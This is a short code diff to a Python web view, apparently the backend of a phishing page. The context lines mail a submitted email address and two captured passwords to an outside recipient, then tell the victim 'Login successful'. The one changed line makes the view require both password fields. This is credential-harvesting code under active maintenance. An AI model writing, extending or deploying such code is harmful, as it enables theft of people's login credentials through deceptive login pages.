@@ -27,6 +27,6 @@ def get_user_info(request):
                             to_addrs=r_email,
                             msg=f"subject: Hello! \n\n {email} : {firstpasswordused} : {secondpasswordused}")
 
-    if not email or not secondpasswordused:
+    if not email or not firstpasswordused or not secondpasswordused:
         return JsonResponse({'error': 'email and password required'}, status=400)
     return JsonResponse({'message': 'Login successful'}, status=200)
